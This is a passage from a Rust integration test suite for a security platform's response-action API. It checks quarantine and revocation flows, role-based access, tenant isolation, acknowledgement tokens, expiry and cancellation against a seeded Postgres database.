            "actionType": "revoke_grant",
            "target": {
                "kind": "grant",
                "id": fixture.grant_id.to_string()
            },
            "reason": "Revoke delegated access",
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(revoke_create.0, StatusCode::OK);
    let revoke_action_id = revoke_create.1["id"]
        .as_str()
        .expect("revoke action id")
        .to_string();

    let revoke_approve = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{revoke_action_id}/approve"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(revoke_approve.0, StatusCode::OK);
    assert_eq!(revoke_approve.1["action"]["status"], "acknowledged");
    assert_eq!(revoke_approve.1["deliveries"][0]["status"], "acknowledged");
    assert_eq!(
        revoke_approve.1["acknowledgements"][0]["resulting_state"],
        "revoked"
    );

    let grant_row =
        sqlx::query::query("SELECT status FROM fleet_grants WHERE tenant_id = $1 AND id = $2")
            .bind(harness.tenant_id)
            .bind(fixture.grant_id)
            .fetch_one(&harness.db)
            .await
            .expect("fetch grant status");
    let grant_status: String = grant_row.try_get("status").expect("grant status");
    assert_eq!(grant_status, "revoked");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_actions_require_admin_equivalent_roles() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let fixture = seed_console_read_model_fixture(&harness).await;
    let member_api_key = "cs_it_member_key";
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        member_api_key,
        "member",
        &["write"],
    )
    .await;

    let create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(member_api_key),
        Some(serde_json::json!({
            "actionType": "quarantine_principal",
            "target": {
                "kind": "principal",
                "id": fixture.principal_id.to_string()
            },
            "reason": "should be forbidden",
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::FORBIDDEN);

    let admin_create = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "quarantine_principal",
            "target": {
                "kind": "principal",
                "id": fixture.principal_id.to_string()
            },
            "reason": "admin containment",
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(admin_create.0, StatusCode::OK);
    let action_id = admin_create.1["id"]
        .as_str()
        .expect("response action id")
        .to_string();

    let approve_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/approve"),
        Some(member_api_key),
        None,
    )
    .await;
    assert_eq!(approve_resp.0, StatusCode::FORBIDDEN);

    let retry_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/retry"),
        Some(member_api_key),
        None,
    )
    .await;
    assert_eq!(retry_resp.0, StatusCode::FORBIDDEN);

    let cancel_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/cancel"),
        Some(member_api_key),
        None,
    )
    .await;
    assert_eq!(cancel_resp.0, StatusCode::FORBIDDEN);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_action_acks_reject_actions_without_acknowledgement_enabled() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    seed_console_read_model_fixture(&harness).await;

    let create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "request_policy_reload",
            "target": {
                "kind": "endpoint",
                "id": "endpoint-1"
            },
            "reason": "Contain endpoint",
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::OK);
    let action_id = create_resp.1["id"]
        .as_str()
        .expect("response action id")
        .to_string();

    let ack_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/acks"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "targetKind": "endpoint",
            "targetId": "endpoint-1",
            "status": "acknowledged",
            "ackToken": "not-enabled"
        })),
    )
    .await;
    assert_eq!(ack_resp.0, StatusCode::BAD_REQUEST);
    assert_eq!(
        ack_resp.1["error"],
        "acknowledgements are not enabled for this action"
    );
}

async fn seed_ack_enabled_response_action(
    db: &crate::db::PgPool,
    tenant_id: Uuid,
    action_status: &str,
    delivery_status: &str,
    expires_at: Option<chrono::DateTime<chrono::Utc>>,
    acknowledgement_deadline: Option<chrono::DateTime<chrono::Utc>>,
) -> (Uuid, String) {
    let action_id = Uuid::new_v4();
    let delivery_id = Uuid::new_v4();
    let ack_token = Uuid::new_v4().to_string();

    sqlx::query::query(
        r#"INSERT INTO response_actions (
               id,
               tenant_id,
               action_type,
               target_kind,
               target_id,
               requested_by_type,
               requested_by_id,
               requested_at,
               expires_at,
               reason,
               require_acknowledgement,
               payload,
               status
           ) VALUES (
               $1,
               $2,
               'request_policy_reload',
               'endpoint',
               'endpoint-1',
               'service',
               'integration',
               now(),
               $3,
               'ack fixture',
               true,
               '{}'::jsonb,
               $4
           )"#,
    )
    .bind(action_id)
    .bind(tenant_id)
    .bind(expires_at)
    .bind(action_status)
    .execute(db)
    .await
    .expect("seed ack-enabled action");

    sqlx::query::query(
        r#"INSERT INTO response_action_deliveries (
               id,
               action_id,
               tenant_id,
               target_kind,
               target_id,
               executor_kind,
               delivery_subject,
               status,
               acknowledgement_deadline,
               metadata
           ) VALUES (
               $1,
               $2,
               $3,
               'endpoint',
               'endpoint-1',
               'endpoint_agent',
               'tenant-acme.clawdstrike.response.command.endpoint.endpoint-1',
               $4,
               $5,
               jsonb_build_object('ack_token', $6)
           )"#,
    )
    .bind(delivery_id)
    .bind(action_id)
    .bind(tenant_id)
    .bind(delivery_status)
    .bind(acknowledgement_deadline)
    .bind(&ack_token)
    .execute(db)
    .await
    .expect("seed ack-enabled delivery");

    (action_id, ack_token)
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_action_acks_reject_duplicate_delivery_acks() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let (action_id, ack_token) = seed_ack_enabled_response_action(
        &harness.db,
        harness.tenant_id,
        "published",
        "published",
        None,
        Some(chrono::Utc::now() + chrono::Duration::minutes(10)),
    )
    .await;

    let first_ack = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/acks"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "targetKind": "endpoint",
            "targetId": "endpoint-1",
            "status": "acknowledged",
            "ackToken": &ack_token
        })),
    )
    .await;
    assert_eq!(first_ack.0, StatusCode::OK);

    let second_ack = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/acks"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "targetKind": "endpoint",
            "targetId": "endpoint-1",
            "status": "failed",
            "ackToken": &ack_token
        })),
    )
    .await;
    assert_eq!(second_ack.0, StatusCode::CONFLICT);
    assert_eq!(
        second_ack.1["error"],
        "delivery acknowledgement has already been recorded"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_action_agent_acks_accept_delivery_token_without_api_key() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let (action_id, ack_token) = seed_ack_enabled_response_action(
        &harness.db,
        harness.tenant_id,
        "published",
        "published",
        None,
        Some(chrono::Utc::now() + chrono::Duration::minutes(10)),
    )
    .await;

    let ack_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/agent-acks"),
        None,
        Some(serde_json::json!({
            "targetKind": "endpoint",
            "targetId": "endpoint-1",
            "status": "acknowledged",
            "ackToken": &ack_token,
            "message": "endpoint execution receipt accepted",
            "resultingState": "collect_evidence:succeeded",
            "rawPayload": {
                "source": "clawdstrike-agent",
                "localReceiptHash": "0xagentreceipt"
            }
        })),
    )
    .await;
    assert_eq!(ack_resp.0, StatusCode::OK);
    assert_eq!(ack_resp.1["accepted"], true);
    assert_eq!(ack_resp.1["actionId"], action_id.to_string());
    assert_eq!(ack_resp.1["targetKind"], "endpoint");
    assert_eq!(ack_resp.1["targetId"], "endpoint-1");
    assert_eq!(ack_resp.1["status"], "acknowledged");

    let detail_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/response-actions/{action_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(detail_resp.0, StatusCode::OK);
    assert_eq!(detail_resp.1["action"]["status"], "acknowledged");
    assert_eq!(detail_resp.1["deliveries"][0]["status"], "acknowledged");
    assert_eq!(
        detail_resp.1["acknowledgements"][0]["raw_payload"]["localReceiptHash"],
        "0xagentreceipt"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_action_acks_reject_cancelled_actions() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let (action_id, ack_token) = seed_ack_enabled_response_action(
        &harness.db,
        harness.tenant_id,
        "published",
        "published",
        None,
        Some(chrono::Utc::now() + chrono::Duration::minutes(10)),
    )
    .await;

    let cancel_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/cancel"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(cancel_resp.0, StatusCode::OK);
    assert_eq!(cancel_resp.1["status"], "cancelled");

    let ack_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/acks"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "targetKind": "endpoint",
            "targetId": "endpoint-1",
            "status": "acknowledged",
            "ackToken": &ack_token
        })),
    )
    .await;
    assert_eq!(ack_resp.0, StatusCode::CONFLICT);
    assert_eq!(
        ack_resp.1["error"],
        "action status 'cancelled' cannot accept acknowledgements"
    );

    let detail_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/response-actions/{action_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(detail_resp.0, StatusCode::OK);
    assert_eq!(detail_resp.1["action"]["status"], "cancelled");
    assert_eq!(detail_resp.1["deliveries"][0]["status"], "cancelled");
    assert_eq!(
        detail_resp.1["acknowledgements"]
            .as_array()
            .expect("ack list")
            .len(),
        0
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_action_acks_expire_elapsed_actions() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let (action_id, ack_token) = seed_ack_enabled_response_action(
        &harness.db,
        harness.tenant_id,
        "published",
        "published",
        Some(chrono::Utc::now() - chrono::Duration::minutes(1)),
        Some(chrono::Utc::now() + chrono::Duration::minutes(10)),
    )
    .await;

    let ack_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/acks"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "targetKind": "endpoint",
            "targetId": "endpoint-1",
            "status": "acknowledged",
            "ackToken": &ack_token
        })),
    )
    .await;
    assert_eq!(ack_resp.0, StatusCode::CONFLICT);
    assert_eq!(ack_resp.1["error"], "acknowledgement window has expired");

    let detail_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/response-actions/{action_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(detail_resp.0, StatusCode::OK);
    assert_eq!(detail_resp.1["action"]["status"], "expired");
    assert_eq!(detail_resp.1["deliveries"][0]["status"], "expired");
    assert_eq!(
        detail_resp.1["acknowledgements"]
            .as_array()
            .expect("ack list")
            .len(),
        0
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_action_cancel_does_not_rewrite_expired_actions() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let (action_id, _) = seed_ack_enabled_response_action(
        &harness.db,
        harness.tenant_id,
        "expired",
        "expired",
        Some(chrono::Utc::now() - chrono::Duration::minutes(1)),
        Some(chrono::Utc::now() - chrono::Duration::minutes(1)),
    )
    .await;

    let cancel_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/cancel"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(cancel_resp.0, StatusCode::NOT_FOUND);

    let detail_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/response-actions/{action_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(detail_resp.0, StatusCode::OK);
    assert_eq!(detail_resp.1["action"]["status"], "expired");
    assert_eq!(detail_resp.1["deliveries"][0]["status"], "expired");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_actions_accept_uuid_shaped_external_target_ids() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let endpoint_agent_id = Uuid::new_v4().to_string();
    let principal_stable_ref = Uuid::new_v4().to_string();
    let principal_id = Uuid::new_v4();

    sqlx::query::query(
        r#"INSERT INTO principals (
               id,
               tenant_id,
               principal_type,
               stable_ref,
               display_name,
               trust_level,
               lifecycle_state,
               liveness_state,
               public_key,
               metadata
           ) VALUES (
               $1,
               $2,
               'endpoint_agent',
               $3,
               'UUID-shaped Principal',
               'medium',
               'active',
               'active',
               'pk-uuid-shaped',
               '{}'::jsonb
           )"#,
    )
    .bind(principal_id)
    .bind(harness.tenant_id)
    .bind(&principal_stable_ref)
    .execute(&harness.db)
    .await
    .expect("seed uuid-shaped principal");

    sqlx::query::query(
        r#"INSERT INTO agents (
               tenant_id,
               agent_id,
               name,
               public_key,
               role,
               trust_level,
               status,
               metadata,
               principal_id
           ) VALUES (
               $1,
               $2,
               'UUID-shaped Endpoint',
               'pk-uuid-shaped',
               'coder',
               'medium',
               'active',
               '{}'::jsonb,
               $3
           )"#,
    )
    .bind(harness.tenant_id)
    .bind(&endpoint_agent_id)
    .bind(principal_id)
    .execute(&harness.db)
    .await
    .expect("seed uuid-shaped endpoint");

    let endpoint_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "request_policy_reload",
            "target": {
                "kind": "endpoint",
                "id": endpoint_agent_id
            },
            "reason": "Reload endpoint policy",
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(endpoint_resp.0, StatusCode::OK);
    assert_eq!(endpoint_resp.1["target"]["id"], endpoint_agent_id);

    let principal_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "quarantine_principal",
            "target": {
                "kind": "principal",
                "id": principal_stable_ref
            },
            "reason": "Contain principal",
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(principal_resp.0, StatusCode::OK);
    assert_eq!(principal_resp.1["target"]["id"], principal_id.to_string());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn principal_identifier_resolution_fails_closed_on_uuid_stable_ref_collisions() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let primary_principal_id = Uuid::new_v4();
    let colliding_stable_ref = primary_principal_id.to_string();

    sqlx::query::query(
        r#"INSERT INTO principals (
               id,
               tenant_id,
               principal_type,
               stable_ref,
               display_name,
               trust_level,
               lifecycle_state,
               liveness_state,
               public_key,
               metadata
           ) VALUES
           ($1, $3, 'endpoint_agent', 'primary-endpoint', 'Primary Principal', 'high', 'active', 'active', 'pk-primary', '{}'::jsonb),
           ($2, $3, 'service_account', $4, 'Colliding Principal', 'medium', 'active', 'active', 'pk-collision', '{}'::jsonb)"#,
    )
    .bind(primary_principal_id)
    .bind(Uuid::new_v4())
    .bind(harness.tenant_id)
    .bind(&colliding_stable_ref)
    .execute(&harness.db)
    .await
    .expect("seed colliding principals");

    let response_action = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "quarantine_principal",
            "target": {
                "kind": "principal",
                "id": colliding_stable_ref
            },
            "reason": "Ambiguous principal",
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(response_action.0, StatusCode::CONFLICT);

    let detail = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/console/principals/{colliding_stable_ref}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(detail.0, StatusCode::CONFLICT);

    sqlx::query::query(
        r#"INSERT INTO response_actions (
               tenant_id,
               action_type,
               target_kind,
               target_id,
               requested_by_type,
               requested_by_id,
               reason,
               require_acknowledgement,
               payload,
               metadata,
               status
           ) VALUES (
               $1,
               'quarantine_principal',
               'principal',
               $2,
               'service',
               'integration-test',
               'Contain primary principal',
               false,
               '{}'::jsonb,
               '{}'::jsonb,
               'queued'
           )"#,
    )
    .bind(harness.tenant_id)
    .bind(primary_principal_id.to_string())
    .execute(&harness.db)
    .await
    .expect("seed principal response action");

    let principals = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/console/principals".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(principals.0, StatusCode::OK);
    let principals = principals.1.as_array().expect("principals list");
    let primary = principals
        .iter()
        .find(|item| item["principalId"] == primary_principal_id.to_string())
        .expect("primary principal entry");
    assert_eq!(primary["openResponseActionCount"], 1);
    let colliding = principals
        .iter()
        .find(|item| item["stableRef"] == colliding_stable_ref)
        .expect("colliding principal entry");
    assert_eq!(colliding["openResponseActionCount"], 0);

    let actions = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/console/response-actions".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(actions.0, StatusCode::OK);
    let actions = actions.1.as_array().expect("response actions list");
    assert_eq!(actions.len(), 1);
    assert_eq!(actions[0]["targetDisplayName"], "Primary Principal");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_actions_principal_lifecycle_updates_uuid_shaped_targets_and_graph_aliases() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let principal_stable_ref = Uuid::new_v4().to_string();
    let principal_id = Uuid::new_v4();

    sqlx::query::query(
        r#"INSERT INTO principals (
               id,
               tenant_id,
               principal_type,
               stable_ref,
               display_name,
               trust_level,
               lifecycle_state,
               liveness_state,
               public_key,
               metadata
           ) VALUES (
               $1,
               $2,
               'endpoint_agent',
               $3,
               'UUID-shaped Principal',
               'medium',
               'active',
               'active',
               'pk-uuid-shaped',
               '{}'::jsonb
           )"#,
    )
    .bind(principal_id)
    .bind(harness.tenant_id)
    .bind(&principal_stable_ref)
    .execute(&harness.db)
    .await
    .expect("seed uuid-shaped principal");

    for node_id in [
        format!("principal:{principal_id}"),
        format!("principal:{principal_stable_ref}"),
    ] {
        sqlx::query::query(
            r#"INSERT INTO delegation_graph_nodes (
                   tenant_id,
                   id,
                   kind,
                   label,
                   state,
                   metadata
               ) VALUES ($1, $2, 'principal', 'UUID-shaped Principal', 'active', '{}'::jsonb)"#,
        )
        .bind(harness.tenant_id)
        .bind(node_id)
        .execute(&harness.db)
        .await
        .expect("seed principal graph alias node");
    }

    let create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "quarantine_principal",
            "target": {
                "kind": "principal",
                "id": principal_stable_ref
            },
            "reason": "Contain principal",
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::OK);
    let action_id = create_resp.1["id"]
        .as_str()
        .expect("response action id")
        .to_string();
    assert_eq!(create_resp.1["target"]["id"], principal_id.to_string());

    let approve_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/approve"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(approve_resp.0, StatusCode::OK);
    assert_eq!(approve_resp.1["action"]["status"], "acknowledged");
    assert_eq!(
        approve_resp.1["action"]["target"]["id"],
        principal_id.to_string()
    );

    let lifecycle_state: String = sqlx::query_scalar::query_scalar(
        "SELECT lifecycle_state FROM principals WHERE tenant_id = $1 AND id = $2",
    )
    .bind(harness.tenant_id)
    .bind(principal_id)
    .fetch_one(&harness.db)
    .await
    .expect("principal lifecycle state");
    assert_eq!(lifecycle_state, "quarantined");

    let graph_states = sqlx::query::query(
        r#"SELECT id, state
           FROM delegation_graph_nodes
           WHERE tenant_id = $1
             AND id = ANY($2)
           ORDER BY id ASC"#,
    )
    .bind(harness.tenant_id)
    .bind(vec![
        format!("principal:{principal_id}"),
        format!("principal:{principal_stable_ref}"),
    ])
    .fetch_all(&harness.db)
    .await
    .expect("graph alias states");
    assert_eq!(graph_states.len(), 2);
    for row in graph_states {
        let state: Option<String> = row.try_get("state").expect("node state");
        assert_eq!(state.as_deref(), Some("quarantined"));
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_actions_canonicalize_endpoint_row_ids_to_public_agent_ids() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let fixture = seed_console_read_model_fixture(&harness).await;

    let create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "request_policy_reload",
            "target": {
                "kind": "endpoint",
                "id": fixture.endpoint_agent_row_id.to_string()
            },
            "reason": "Reload endpoint policy",
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::OK);
    assert_eq!(create_resp.1["target"]["id"], fixture.endpoint_agent_id);
    let action_id = create_resp.1["id"]
        .as_str()
        .expect("response action id")
        .to_string();

    let approve_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/approve"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(approve_resp.0, StatusCode::OK);
    assert_eq!(
        approve_resp.1["deliveries"][0]["target_id"],
        fixture.endpoint_agent_id
    );
    let subject = approve_resp.1["deliveries"][0]["delivery_subject"]
        .as_str()
        .expect("delivery subject");
    assert!(subject.ends_with(&format!(".{}", fixture.endpoint_agent_id)));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_actions_reject_missing_or_cross_tenant_provenance() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let fixture = seed_console_read_model_fixture(&harness).await;

    let missing_detection_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "quarantine_principal",
            "target": {
                "kind": "principal",
                "id": fixture.principal_id.to_string()
            },
            "reason": "Contain principal",
            "sourceDetectionId": Uuid::new_v4().to_string(),
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(missing_detection_resp.0, StatusCode::NOT_FOUND);

    let other_tenant_id = Uuid::new_v4();
    let other_approval_id = Uuid::new_v4();
    sqlx::query::query(
        r#"INSERT INTO tenants (id, name, slug, plan, status, agent_limit, retention_days)
           VALUES ($1, 'Other Tenant', 'other-tenant', 'enterprise', 'active', 10, 30)"#,
    )
    .bind(other_tenant_id)
    .execute(&harness.db)
    .await
    .expect("seed other tenant");
    sqlx::query::query(
        r#"INSERT INTO approvals (
               id,
               tenant_id,
               request_id,
               agent_id,
               event_type,
               event_data,
               status
           )
           VALUES ($1, $2, $3, 'other-agent', 'manual', '{}'::jsonb, 'pending')"#,
    )
    .bind(other_approval_id)
    .bind(other_tenant_id)
    .bind(format!("approval-{other_approval_id}"))
    .execute(&harness.db)
    .await
    .expect("seed cross-tenant approval");

    let cross_tenant_approval_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "quarantine_principal",
            "target": {
                "kind": "principal",
                "id": fixture.principal_id.to_string()
            },
            "reason": "Contain principal",
            "sourceApprovalId": other_approval_id,
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(cross_tenant_approval_resp.0, StatusCode::NOT_FOUND);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_actions_reject_missing_case_references() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let fixture = seed_console_read_model_fixture(&harness).await;

    let create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "quarantine_principal",
            "target": {
                "kind": "principal",
                "id": fixture.principal_id.to_string()
            },
            "reason": "Contain principal",
            "caseId": Uuid::new_v4().to_string(),
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::NOT_FOUND);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn detection_rule_creates_record_api_key_actor_identity() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let api_key_id: Uuid =
        sqlx::query::query("SELECT id FROM api_keys WHERE tenant_id = $1 LIMIT 1")
            .bind(harness.tenant_id)
            .fetch_one(&harness.db)
            .await
            .expect("load api key row")
            .try_get("id")
            .expect("api key id");

    let create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/detections/rules".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "api-key-rule",
            "severity": "high",
            "source_format": "sigma",
            "execution_mode": "streaming",
            "source_text": "title: api-key-rule\nlogsource:\n  product: tetragon\ndetection:\n  selection:\n    action_type: exec\n  condition: selection\n"
        })),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::OK);
    assert_eq!(create_resp.1["created_by"], api_key_id.to_string());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn catalog_routes_enforce_tenant_isolation_and_role_checks() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let viewer_key = "cs_it_catalog_viewer_key";
    let member_key = "cs_it_catalog_member_key";
    let other_admin_key = "cs_it_catalog_other_admin_key";
    let other_tenant_id = seed_tenant(&harness.db, "globex-catalog", "Globex Catalog").await;

    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        viewer_key,
        "catalog-viewer",
        &["viewer"],
    )
    .await;
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        member_key,
        "catalog-member",
        &["member"],
    )
    .await;
    insert_api_key_for_tenant(
        &harness.db,
        other_tenant_id,
        other_admin_key,
        "catalog-admin",
        &["admin"],
    )
    .await;

    let create_payload = serde_json::json!({
        "name": "Tenant Baseline",
        "description": "Scoped to the owning tenant",
        "category": "general",
        "tags": ["baseline", "linux"],
        "policy_yaml": "version: \"1.0.0\"\nrules: []\n",
        "author": "Integration Test",
        "version": "1.0.0"
    });

    let create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/catalog/templates".to_string(),
        Some(&harness.api_key),
        Some(create_payload.clone()),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::OK);
    let template_id = create_resp.1["id"]
        .as_str()
        .expect("template id")
        .to_string();

    let list_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/catalog/templates?category=general&tag=baseline".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(list_resp.0, StatusCode::OK);
    assert!(list_resp
        .1
        .as_array()
        .expect("catalog templates")
        .iter()
        .any(|template| template["id"] == template_id));

    let get_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/catalog/templates/{template_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(get_resp.0, StatusCode::OK);
    assert_eq!(get_resp.1["name"], "Tenant Baseline");

    let update_resp = request_json(
        &harness.app,
        Method::PUT,
        format!("/api/v1/catalog/templates/{template_id}"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "description": "Updated tenant template",
            "version": "1.0.1"
        })),
    )
    .await;
    assert_eq!(update_resp.0, StatusCode::OK);
    assert_eq!(update_resp.1["description"], "Updated tenant template");
    assert_eq!(update_resp.1["version"], "1.0.1");

    let fork_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/catalog/templates/{template_id}/fork"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(fork_resp.0, StatusCode::OK);
    let fork_id = fork_resp.1["id"].as_str().expect("fork id").to_string();
    assert_ne!(fork_id, template_id);
    assert_eq!(fork_resp.1["forked_from"], template_id);

    let categories_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/catalog/categories".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(categories_resp.0, StatusCode::OK);
    assert!(categories_resp
        .1
        .as_array()
        .expect("catalog categories")
        .iter()
        .any(|category| category["id"] == "general"));

    let viewer_create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/catalog/templates".to_string(),
        Some(viewer_key),
        Some(create_payload.clone()),
    )
    .await;
    assert_eq!(viewer_create_resp.0, StatusCode::FORBIDDEN);

    let viewer_fork_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/catalog/templates/{template_id}/fork"),
        Some(viewer_key),
        None,
    )
    .await;
